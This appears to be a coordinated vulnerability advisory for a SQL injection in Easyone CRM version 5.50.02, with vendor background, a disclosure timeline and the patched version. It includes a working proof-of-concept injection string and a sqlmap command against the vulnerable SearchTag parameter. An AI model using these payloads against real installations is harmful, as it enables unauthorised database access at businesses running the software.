# EasyoneCRM-5.50.02-SQLinjection
Easyone One is an Italian CRM company with 14 years of experience with a mission: to organize the sales processes of companies, in an increasingly complex and competitive market, through the digitization of processes from the most important and strategic activity: the relationship with the customer.
Easyone is not a CRM vendor, it produce and develop directly CRM for the Italian market.

Easyone developed integration with the most popular management systems on the Italian market: Alyante and Team System Metodo; SageX3, Galileo by San Marco Informatica, Arca by Wolters Kluver, Business by NTS, MecSal by Passpartout and more.

Easyone has more than 1500 active customers on the national territory.

Exploiting this vulnerability allows a remote attacker to obtain control of the database. RCE is not guaranteed, depends on the privileges and capabilities of the user running the dbms. 

Vulnerable version: 5.50.02
Patched version: 5.50.02.03

# Timeline
- 30/08/2022 - Contacted Easyone IT department via e-mail regarding the vulnerability
- 05/09/2022 - Contacted Easyone IT department via telephone regarding availability slot to discuss the vulnerability
- 19/09/2022 - Call with Easyone IT department - vulnerability explained and recognized by Easyone IT department
- 19/09/2022 - CVE request approved by Easyone IT department
- 19/09/2022 - Contacted Easyone IT department via e-mail with summary of the call - patching of the vulnerability planned 
- 28/10/2022 - Contacted Easyone IT department asking about patching 
- 28/10/2022 - Easyone IT department confirms the successful patching and the release of the patched version
- 02/11/2022 - First CVE request sent  
- 21/11/2022 - Reminder e-mail to cve.mitre.org
- 29/11/2022 - Reminder e-mail to cve.mitre.org
- 06/12/2022 - Reminder e-mail to cve.mitre.org
- 14/12/2022 - cve.mitre.org asked about advisory
- 15/12/2022 - CVE request with advisory provided to cve.mitre.org 


## Execution
- Vulnerable GET parameter: domain.com/Services/Misc.asmx/SearchTag?text=SQLI 
- PoC: 
```
domain.com/Services/Misc.asmx/SearchTag?text=z' OR 1=1 --
```
- PoC via sqlmap: 
```
sqlmap -u https://domain.com/Services/Misc.asmx/SearchTag?text=a --dbms=DBMS --batch
```

## Screenshots
![Immagine 2022-12-15 184659](https://user-images.githubusercontent.com/119488062/207931523-f5db2479-9bc2-429a-ab24-96ea6ee33919.png)

## Automated PoC currently in development

# Authors
Luca Bernardi, Davide Bianchin, Fortunato [fox] Lodari @ Deda Cloud Cybersecurity Team
